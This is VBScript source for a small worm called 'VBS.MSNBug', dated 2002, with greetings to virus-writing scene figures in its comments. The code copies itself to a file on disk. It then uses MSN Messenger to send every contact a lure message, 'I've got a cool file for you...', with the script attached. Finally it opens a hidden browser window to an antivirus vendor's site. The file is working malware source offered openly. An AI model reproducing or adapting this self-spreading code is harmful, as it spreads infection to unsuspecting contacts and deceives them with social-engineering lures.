' VBS.MSNBug by FSo
' Demonstrating MSN hijacking issue
'
' The fact that there are 15 lines of
' code in this file speaks for itself!
'
' 10 LINES!  World's smallest (viable)
' internet worm.  Okay, maybe not.
'
' Greets:
'	Adolfo - OE code gave me the desire to be unique.
'	Zulu - Thanks for your e-mails, tips, ...
'	CW - How's this for that huge collection?
'	J. Patrick - You gonna REPLY to my e-mails? :o)
'	Benny - Even though I am a l4mer VB$ kiddie koder,
'		he still finds words of encouragement, I
'		like that.
'	Bumblebee - The WSOCK32 hook project fell apart,
'		as you probably know by now, but thanx
'		4 your help neway.
'	AVP - We will never die!  Long live Benny!
'
' We must fight back against the advance of hegemonic corporate
' influence, and make one thing absolutely sure -- we WILL be
' heard!!!
'
' February 15, 2002
'
' Dedicated to Stacey Quirarte
' Good luck @ districts!

CreateObject("Scripting.FileSystemObject").CopyFile WScript.ScriptFullName, "C:\FUNNYONE.VBS"
Set objMsg = CreateObject("Messenger.MsgrObject")
Do While objMsg.LocalState = 1
Loop
Set Contacts = objMsg.List(0)
For X = 0 To Contacts.Count - 1
	Contacts.Item(X).SendText "MIME-Version: 1.0"&vbCrLf&"Content-Type: text/plain; charset=UTF-8"&vbCrLf&vbCrLf, "I've got a cool file for you..."&vbCrLf&"Check it out!", 0
	Contacts.Item(X).SendFile "C:\FUNNYONE.VBS"
Next
Set Msie = CreateObject("InternetExplorer.Application")
Msie.Visible = False
Do While Msie.Busy
Loop
Msie.Navigate "http://www.avp.ch/"
Set Msie = Nothing